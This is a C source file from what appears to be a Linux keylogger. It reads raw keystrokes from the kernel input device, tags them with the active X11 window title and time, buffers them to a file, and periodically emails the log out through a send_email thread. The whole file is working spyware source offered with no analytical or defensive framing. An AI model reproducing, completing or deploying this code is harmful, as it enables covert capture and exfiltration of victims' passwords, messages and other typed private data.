#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <linux/input.h>
#include <pthread.h>
#include <errno.h>
#include <sys/select.h>
#include "utils/helpers.h"
#include "keylogger/buffer.h"
#include "keylogger/utils/keyboard.h"
#include "keylogger/utils/window_x11.h"
#include "keylogger/keylogger.h"
#include "core_state.h"

#define KEY_BUFFER_SIZE 64
#define TEXT_BUFFER_SIZE 4096
#define KEYCODE_OFFSET 8
#ifndef DURATION
#error "DURATION is not defined"
#endif

pthread_mutex_t file_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_mutex_t window_mutex = PTHREAD_MUTEX_INITIALIZER;

void *read_keyboard(void *arg){
    HandlerContext *context = (HandlerContext*) arg;
    struct input_event ev;
    char key[KEY_BUFFER_SIZE];
    int write_error;
    BufferText buffer;

    if (buffer_text_init(&buffer)) pthread_exit((void *)1);

    while (!exit_flag) {
        char *current_window = NULL;
        int code;

        if (read(context->fd, &ev, sizeof(struct input_event)) == -1) {
            fprintf(stderr, "Error reading event\n");
            pthread_exit((void *)1);
        }

        if (get_active_window(context->keyboard_handler.dpy, &current_window)){
            fprintf(stderr, "Error getting active window\n");
        } else {
            int flag_update_current_window = 0;
            pthread_mutex_lock(&window_mutex);
            if (!(context->keyboard_handler.active_window)){
                flag_update_current_window = 1;
            } else if (strcmp(context->keyboard_handler.active_window, current_window)) {
                free(context->keyboard_handler.active_window);
                flag_update_current_window = 1;
            }
            pthread_mutex_unlock(&window_mutex);
            if (flag_update_current_window){
                char time_str[9];
                char f_str[512];
                get_current_time(time_str, sizeof(time_str));
                pthread_mutex_lock(&window_mutex);
                context->keyboard_handler.active_window = strdup(current_window);
                snprintf(f_str, sizeof(f_str), "\n\n[%s] %s\n", time_str, context->keyboard_handler.active_window);

                write_error = write_or_buffer_event(&(context->file_handler), &buffer, f_str, &file_mutex);
                pthread_mutex_unlock(&window_mutex);
                if (write_error) {
                    buffer_text_clear(&buffer);
                    pthread_exit((void *)1);
                }
            }
            free(current_window);
        }

        if (ev.type == EV_KEY) {
            code = ev.code + KEYCODE_OFFSET;
            if (ev.value == 1) {
                xkb_state_update_key(context->keyboard_handler.state, code, XKB_KEY_DOWN);
                if (!get_key_string(context->keyboard_handler.state, code, key, sizeof(key))) {
                    write_error = write_or_buffer_event(&(context->file_handler), &buffer, key, &file_mutex);
                    if (write_error){
                        buffer_text_clear(&buffer);
                        pthread_exit((void *)1);
                    }
                }
            } else if (ev.value == 0) {
                xkb_state_update_key(context->keyboard_handler.state, code, XKB_KEY_UP);
            }
        }
    }
    buffer_text_clear(&buffer);
    pthread_exit((void *)0);
}

void *send_email(void *arg){
    HandlerContext *context = (HandlerContext*) arg;
    while (!exit_flag){
        fd_set read_fds;
        FD_ZERO(&read_fds);
        FD_SET(pipe_fd_email[0], &read_fds);

        struct timeval tv;
        tv.tv_sec = DURATION * 60;
        tv.tv_usec = 0;

        int select_result = select(pipe_fd_email[0] + 1, &read_fds, NULL, NULL, &tv);
        if (select_result > 0){
            char buffer[10];
            read(pipe_fd_email[0], buffer, sizeof(buffer));
            continue;
        } else if (select_result == 0){
            pthread_mutex_lock(&window_mutex);
            if (context->keyboard_handler.active_window) {
                free(context->keyboard_handler.active_window);
                context->keyboard_handler.active_window = NULL;
            }
            pthread_mutex_unlock(&window_mutex);

            pthread_mutex_lock(&file_mutex);
            send_file_via_email(&(context->sender), &(context->file_handler));
            pthread_mutex_unlock(&file_mutex);
        } else {
            if (errno == EINTR) continue;
            fprintf(stderr, "Select error: %s\n", strerror(errno));
            pthread_exit((void *)1);
        }
    }
    pthread_exit((void *)0);
}

int context_init(HandlerContext *context){
    int error = 0;
    error = FileHandler_init(&(context->file_handler));
    error = KeyboardHandler_init(&(context->keyboard_handler)) || error;
    error = EmailSender_init(&(context->sender)) || error;
    error = open_file_event_keyboard(&(context->fd)) || error;
    return error;
}

void context_cleanup(HandlerContext *context){
    FileHandler_close(&(context->file_handler));
    if (context->fd != -1){
        close(context->fd);
    }
    KeyboardHandler_cleanup(&(context->keyboard_handler));
    EmailSender_cleanup(&(context->sender));
}
